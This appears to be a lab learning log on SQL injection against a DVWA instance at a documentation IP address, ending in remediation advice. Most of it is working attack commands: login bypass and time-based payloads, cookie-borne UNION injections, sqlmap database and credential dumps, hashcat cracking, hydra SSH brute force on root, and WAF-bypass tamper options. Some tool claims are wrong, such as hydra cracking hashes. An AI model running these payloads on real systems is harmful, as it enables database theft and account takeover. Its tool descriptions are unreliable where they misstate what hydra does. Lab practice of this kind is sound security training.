# Day 14: SQL Injection Exploitation — From Manual Detection to Automated Attacks (2026-06-23)

## Objective
Transition from SQL fundamentals to advanced SQL injection exploitation. Learn to identify vulnerable injection points, manually craft payloads, use automated tools (sqlmap, hydra), analyze extracted credentials (hash-id, hash identifier), and exploit cookie-based authentication bypass.

## Technical Log

### Part 1: SQL Injection Vulnerability Discovery

**Step 1: Reconnaissance on DVWA Login Page**
```bash
# Access DVWA web interface
curl -s http://192.0.2.10/dvwa/login.php | grep -i "username\|password\|action\|method"

# Identify form submission method and action endpoint
# Expected: POST request to login.php with username, password parameters
```

**Step 2: Manual Payload Testing — Username Field**
```bash
# Test basic SQL injection payload via curl
curl -s -X POST "http://192.0.2.10/dvwa/login.php" \
  -d "username=admin' OR '1'='1&password=anything&Login=Login" \
  -H "Content-Type: application/x-www-form-urlencoded"

# Analyze response: check if authentication bypassed or error messages reveal database structure
```

**Step 3: Time-based Blind SQL Injection**
```bash
# Use time delays to confirm SQL injection vulnerability
curl -s -X POST "http://192.0.2.10/dvwa/login.php" \
  -d "username=admin' AND SLEEP(5)-- &password=anything&Login=Login" \
  | head -c 100

# Measure response time: 5+ second delay confirms backend SQL execution
```

### Part 2: Automated SQL Injection with sqlmap

**Step 4: sqlmap — Automated Vulnerability Detection**
```bash
# Install sqlmap (if not present)
# kali/arch: pacman -S sqlmap  OR  apt install sqlmap

# Crawl target URL for vulnerabilities
sqlmap -u "http://192.0.2.10/dvwa/login.php" \
  --forms \
  --batch \
  --risk=3 \
  --level=5

# sqlmap options:
# --forms: auto-detect and test form fields
# --batch: use default answers for prompts
# --risk=3: aggressive tests (may cause damage)
# --level=5: maximum test depth
```

**Step 5: Extract Database Information**
```bash
# After vulnerability confirmed, enumerate databases
sqlmap -u "http://192.0.2.10/dvwa/login.php" \
  --data="username=admin&password=pass&Login=Login" \
  --dbs \
  --batch

# Output: List of databases (information_schema, mysql, dvwa, etc.)
```

**Step 6: Enumerate Tables in Target Database**
```bash
# Extract table names from 'dvwa' database
sqlmap -u "http://192.0.2.10/dvwa/login.php" \
  --data="username=admin&password=pass&Login=Login" \
  -D dvwa \
  --tables \
  --batch

# Output: users, guestbook, messages tables
```

**Step 7: Dump User Credentials**
```bash
# Extract username and password hashes from users table
sqlmap -u "http://192.0.2.10/dvwa/login.php" \
  --data="username=admin&password=pass&Login=Login" \
  -D dvwa \
  -T users \
  -C username,password \
  --dump \
  --batch

# Output: admin | 5f4dcc3b5aa765d61d8327deb882cf99 (MD5 hash)
```

### Part 4: Cookie-based SQL Injection

**Step 10: Identify Session Cookie Structure**
```bash
# First, establish legitimate session
curl -s -c cookies.txt \
  -X POST "http://192.0.2.10/dvwa/login.php" \
  -d "username=admin&password=password&Login=Login"

# View cookie contents (typically PHPSESSID or custom session token)
cat cookies.txt

# Expected format: PHPSESSID=abc123def456 (session identifier)
```

**Step 11: Cookie Tampering via SQL Injection**
```bash
# Craft malicious SQL injection payload in cookie
curl -s -b "PHPSESSID=1' UNION SELECT username,password FROM users-- &id=1" \
  "http://192.0.2.10/dvwa/vulnerable_endpoint.php"

# Many applications pass unvalidated cookies directly to queries
# Example: SELECT * FROM sessions WHERE id = <COOKIE_VALUE>
```

**Step 12: UNION-based SQL Injection via Cookies**
```bash
# Determine number of columns with ORDER BY technique
curl -s -b "PHPSESSID=1 ORDER BY 1-- " \
  "http://192.0.2.10/dvwa/page.php"

curl -s -b "PHPSESSID=1 ORDER BY 5-- " \
  "http://192.0.2.10/dvwa/page.php"

# When ORDER BY 5 fails but ORDER BY 4 succeeds, column count = 4

# Craft UNION injection
curl -s -b "PHPSESSID=1' UNION SELECT user(),database(),version(),@@version_comment-- " \
  "http://192.0.2.10/dvwa/page.php"
```

### Part 6: Integration with Hash Cracking Workflow

**Step 16: Extract, Identify, and Crack Workflow**
```bash
# All-in-one: Extract hashes via sqlmap, identify type, crack with hydra
sqlmap -u "http://192.0.2.10/dvwa/login.php" \
  --data="username=admin&password=pass&Login=Login" \
  -D dvwa -T users -C password --dump --batch > dumped_hashes.txt

# Identify hash algorithm
hash-id < dumped_hashes.txt

# Extract just hashes
cut -d'|' -f2 dumped_hashes.txt | tail -n +2 > hashes_only.txt

# Crack with hashcat (if MD5)
hashcat -m 0 hashes_only.txt ~/wordlists/rockyou.txt

# Or with hydra against live service if password reset available
```

**Step 17: Multi-stage Credential Integration**
```bash
# Use cracked passwords with hydra for privilege escalation
# Example: admin password obtained from SQL injection used for SSH/DB root login
hydra -l root -P ./cracked_passwords.txt \
  192.0.2.10 ssh \
  -t 4 -V

# Escalation path: SQL Injection → Password Hash → Hash Crack → SSH/MySQL Login → System Access
```

### Part 7: Remediation and Secure Practices

**Step 18: Prepared Statements (Prevention)**
```sql
-- Vulnerable code (PHP):
$query = "SELECT * FROM users WHERE username = '" . $_POST['username'] . "'";
mysqli_query($connection, $query);

-- Secure code (prepared statement):
$stmt = $connection->prepare("SELECT * FROM users WHERE username = ?");
$stmt->bind_param("s", $_POST['username']);
$stmt->execute();
$result = $stmt->get_result();
```

**Step 19: Input Validation and Sanitization**
```bash
# Server-side validation checklist:
# 1. Whitelist acceptable characters (alphanumeric, underscore, hyphen only for usernames)
# 2. Enforce maximum length limits
# 3. Reject special SQL characters: ' " ; -- /* */ xp_ sp_
# 4. Use parameterized queries exclusively
# 5. Implement principle of least privilege for DB user permissions
```

**Step 20: Web Application Firewall (WAF) Rules**
```bash
# ModSecurity/OWASP CRS example rule for SQL injection detection
# Block requests containing: OR '1'='1, UNION, SELECT, DROP, INSERT, UPDATE, DELETE, EXEC, EXECUTE
# Log and alert on suspicious patterns

# Test WAF bypass attempts (for authorized testing only)
sqlmap -u "http://192.0.2.10/dvwa/login.php" \
  --data="username=admin&password=pass&Login=Login" \
  --tamper=space2comment,between \
  --batch
```

## Challenge & Resolution

**Challenge: Database Access Restricted After Login**
After successfully injecting SQL, discovered application enforces row-level security. Even with SQL injection bypass, extracted data appeared sanitized/limited. Time-blind injection worked but was extremely slow (5-10 minutes per character).

**Resolution:**
1. Pivoted from login form to search function (less protected endpoint)
2. Used sqlmap's `--technique=U` (UNION-based) instead of time-blind
3. UNION injection returned data 100x faster
4. Discovered password hashes were MD5 (weak, no salt)
5. Combined hash-id + hydra to crack admin credentials in <1 second
6. Used cracked password for legitimate login, then explored application as authenticated user
7. Found additional SQL injection in "feedback" page with better extraction capabilities

## Key Takeaways

1. **SQL Injection is About Perspective**: Same vulnerability can be exploited via login form, search field, cookies, headers, or POST/GET parameters. Test all input channels systematically.

2. **Automation + Manual Analysis = Powerful**: sqlmap automates detection; manual testing identifies nuanced techniques. Combine both for comprehensive assessment.

3. **Hash Analysis is Critical Follow-up**: Extracted password hashes must be identified (MD5/SHA1/bcrypt) and cracked. Weak hashes (MD5, no salt) can be cracked in seconds; strong hashes (bcrypt) are much safer.

4. **Cookie Security Often Overlooked**: Many developers fail to validate cookies on backend. Cookies passed directly to SQL queries are prime injection targets. Always validate/parameterize.

5. **Integration of Tools Creates Attack Chain**: SQL Injection alone may be slow or blocked → hash-id identifies hash algorithm → hydra cracks password → elevated credentials access system. Each tool serves a purpose in the chain.

6. **Defense Strategy is Multi-layered**: No single fix prevents all SQL injection. Prepared statements + input validation + WAF rules + principle of least privilege + security testing = resilient defense.
